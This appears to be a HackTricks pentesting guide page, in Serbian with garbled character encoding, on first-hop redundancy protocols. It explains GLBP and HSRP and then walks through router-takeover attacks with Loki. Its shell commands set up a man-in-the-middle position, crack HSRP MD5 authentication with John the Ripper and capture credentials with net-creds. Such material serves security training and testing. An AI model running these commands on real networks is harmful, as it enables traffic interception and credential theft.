# Napadi GLBP & HSRP

{% hint style="success" %}
NauÄite i veÅ¾bajte hakovanje AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
NauÄite i veÅ¾bajte hakovanje GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Pregled FHRP Preuzimanja

### Uvidi u FHRP
FHRP je dizajniran da pruÅ¾i mreÅ¾nu otpornost spajanjem viÅ¡e rutera u jedinicu virtualnog rutera, Äime se poboljÅ¡ava raspodela optereÄ‡enja i tolerancija na greÅ¡ke. Cisco Systems je uveo prominentne protokole u ovoj grupi, poput GLBP i HSRP.

### Uvidi u GLBP Protokol
Cisco-ova kreacija, GLBP, funkcioniÅ¡e na TCP/IP sloju, koristeÄ‡i UDP na portu 3222 za komunikaciju. Ruteri u GLBP grupi razmenjuju "hello" pakete na intervalima od 3 sekunde. Ako ruter ne poÅ¡alje ove pakete tokom 10 sekundi, pretpostavlja se da je van mreÅ¾e. MeÄ‘utim, ovi tajmeri nisu fiksni i mogu se menjati.

### GLBP Operacije i Raspodela OptereÄ‡enja
GLBP se istiÄe omoguÄ‡avanjem raspodele optereÄ‡enja preko rutera koriÅ¡Ä‡enjem jedne virtuelne IP adrese uparene sa viÅ¡e virtuelnih MAC adresa. U GLBP grupi, svaki ruter uÄestvuje u prosleÄ‘ivanju paketa. Za razliku od HSRP/VRRP, GLBP nudi pravo balansiranje optereÄ‡enja kroz nekoliko mehanizama:

- **Balansiranje OptereÄ‡enja Zavisno od Hosta:** OdrÅ¾ava konzistentno dodeljivanje AVF MAC adrese hostu, Å¡to je bitno za stabilne NAT konfiguracije.
- **Round-Robin Balansiranje OptereÄ‡enja:** Podrazumevani pristup, koji menja dodeljivanje AVF MAC adrese meÄ‘u zahtevajuÄ‡im hostovima.
- **Balansiranje OptereÄ‡enja TeÅ¾inskim Round-Robinom:** Raspodeljuje optereÄ‡enje na osnovu unapred definisanih metrika "TeÅ¾ine".

### KljuÄni Komponenti i Terminologije u GLBP
- **AVG (Aktivni Virtuelni Gateway):** Glavni ruter, odgovoran za dodeljivanje MAC adresa ruterima vrÅ¡njacima.
- **AVF (Aktivni Virtuelni ProsleÄ‘ivaÄ):** Ruter odreÄ‘en za upravljanje mreÅ¾nim saobraÄ‡ajem.
- **GLBP Prioritet:** Metrika koja odreÄ‘uje AVG, poÄevÅ¡i od podrazumevane vrednosti od 100 i kreÄ‡uÄ‡i se izmeÄ‘u 1 i 255.
- **GLBP TeÅ¾ina:** OdraÅ¾ava trenutno optereÄ‡enje na ruteru, podesivo ruÄno ili putem PraÄ‡enja Objekata.
- **GLBP Virtuelna IP Adresa:** SluÅ¾i kao podrazumevani gateway mreÅ¾e za sve povezane ureÄ‘aje.

Za interakcije, GLBP koristi rezervisanu multicast adresu 224.0.0.102 i UDP port 3222. Ruteri Å¡alju "hello" pakete na intervalima od 3 sekunde i smatraju se neoperativnim ako se paket propusti tokom 10 sekundi.

### Mehanizam Napada GLBP
NapadaÄ moÅ¾e postati primarni ruter slanjem GLBP paketa sa najviÅ¡om vrednoÅ¡Ä‡u prioriteta (255). Ovo moÅ¾e dovesti do DoS ili MITM napada, omoguÄ‡avajuÄ‡i presretanje ili preusmeravanje saobraÄ‡aja.

### IzvoÄ‘enje Napada GLBP sa Loki
[Loki](https://github.com/raizo62/loki_on_kali) moÅ¾e izvrÅ¡iti GLBP napad ubrizgavanjem paketa sa postavljenim prioritetom i teÅ¾inom na 255. Pred-napad koraci ukljuÄuju prikupljanje informacija poput virtuelne IP adrese, prisustva autentikacije i vrednosti prioriteta rutera koriÅ¡Ä‡enjem alata poput Wireshark.

Koraci Napada:
1. Prebacite se u promiskuitetni reÅ¾im i omoguÄ‡ite IP prosleÄ‘ivanje.
2. Identifikujte ciljni ruter i dobijte njegovu IP adresu.
3. GeneriÅ¡ite Gratuitous ARP.
4. Ubacite zlonamerni GLBP paket, predstavljajuÄ‡i se kao AVG.
5. Dodelite sekundarnu IP adresu mreÅ¾nom interfejsu napadaÄa, oponaÅ¡ajuÄ‡i GLBP virtuelnu IP.
6. Implementirajte SNAT za potpunu vidljivost saobraÄ‡aja.
7. Podesite rutiranje kako biste obezbedili nastavak pristupa internetu preko originalnog AVG rutera.

PrateÄ‡i ove korake, napadaÄ se pozicionira kao "Äovek u sredini", sposoban za presretanje i analizu mreÅ¾nog saobraÄ‡aja, ukljuÄujuÄ‡i neÅ¡ifrovane ili osetljive podatke.

Za demonstraciju, evo potrebnih komandi:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
### Pasivno objaÅ¡njenje HSRP preuzimanja sa detaljima komandi

#### Pregled HSRP (Hot Standby Router/Redundancy Protocol)
HSRP je Cisco vlasniÄki protokol dizajniran za redundanciju mreÅ¾nih gateway-a. OmoguÄ‡ava konfiguraciju viÅ¡e fiziÄkih rutera u jedinicu sa zajedniÄkom IP adresom. Ova logiÄka jedinica je upravljana primarnim routerom odgovornim za usmeravanje saobraÄ‡aja. Za razliku od GLBP-a, koji koristi metrike poput prioriteta i teÅ¾ine za balansiranje optereÄ‡enja, HSRP se oslanja na jednog aktivnog rutera za upravljanje saobraÄ‡ajem.

#### Uloge i terminologija u HSRP-u
- **HSRP Aktivni Router**: UreÄ‘aj koji deluje kao gateway, upravljajuÄ‡i protokom saobraÄ‡aja.
- **HSRP Standby Router**: Rezervni router, spreman da preuzme ulogu ako aktivni router zakaÅ¾e.
- **HSRP Grupa**: Skup rutera koji saraÄ‘uju kako bi formirali jedan otporan virtuelni router.
- **HSRP MAC Adresa**: Virtuelna MAC adresa dodeljena logiÄkom routeru u HSRP postavci.
- **HSRP Virtuelna IP Adresa**: Virtuelna IP adresa grupe HSRP, deluje kao podrazumevani gateway za povezane ureÄ‘aje.

#### Verzije HSRP-a
HSRP dolazi u dve verzije, HSRPv1 i HSRPv2, koje se razlikuju uglavnom po kapacitetu grupe, koriÅ¡Ä‡enju multicast IP adresa i strukturi virtuelne MAC adrese. Protokol koristi specifiÄne multicast IP adrese za razmenu informacija o uslugama, sa Hello paketima poslatim svakih 3 sekunde. Router se smatra neaktivnim ako ne primi paket u intervalu od 10 sekundi.

#### Mehanizam napada HSRP-a
Napadi HSRP-a ukljuÄuju prisilno preuzimanje uloge Aktivnog Routera ubrizgavanjem maksimalne vrednosti prioriteta. Ovo moÅ¾e dovesti do napada Äovek-u-sredini (MITM). Bitni koraci pre napada ukljuÄuju prikupljanje podataka o HSRP postavci, Å¡to se moÅ¾e uraditi koriÅ¡Ä‡enjem Wireshark-a za analizu saobraÄ‡aja.

#### Koraci za zaobilaÅ¾enje HSRP autentikacije
1. SaÄuvajte mreÅ¾ni saobraÄ‡aj koji sadrÅ¾i HSRP podatke kao .pcap fajl.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Izdvojite MD5 heÅ¡eve iz .pcap fajla koristeÄ‡i hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Provalite MD5 heÅ¡eve koristeÄ‡i John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**IzvrÅ¡avanje HSRP ubrizgavanja pomoÄ‡u Lokija**

1. Pokrenite Lokija da identifikujete HSRP oglase.
2. Postavite mreÅ¾ni interfejs u promiskuitetni reÅ¾im i omoguÄ‡ite prosleÄ‘ivanje IP adresa.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Koristite Lokija da ciljate odreÄ‘eni router, unesite provaljenu HSRP lozinku i izvrÅ¡ite neophodne konfiguracije da se predstavite kao Aktivni Router.
4. Nakon Å¡to preuzmete ulogu Aktivnog Routera, konfiguriÅ¡ite svoj mreÅ¾ni interfejs i IP tabele da presretnu legitimni saobraÄ‡aj.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Izmenite rutiranje tabele da rutira saobraÄ‡aj preko bivÅ¡eg Aktivnog Routera.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Koristite net-creds.py ili sliÄan alat da uhvatite akreditive iz presretnutog saobraÄ‡aja.
```shell
sudo python2 net-creds.py -i eth0
```

IzvrÅ¡avanje ovih koraka stavlja napadaÄa u poziciju da presretne i manipuliÅ¡e saobraÄ‡ajem, sliÄno postupku za GLBP preuzimanje. Ovo istiÄe ranjivost u protokolima redundancije poput HSRP-a i potrebu za snaÅ¾nim sigurnosnim merama.
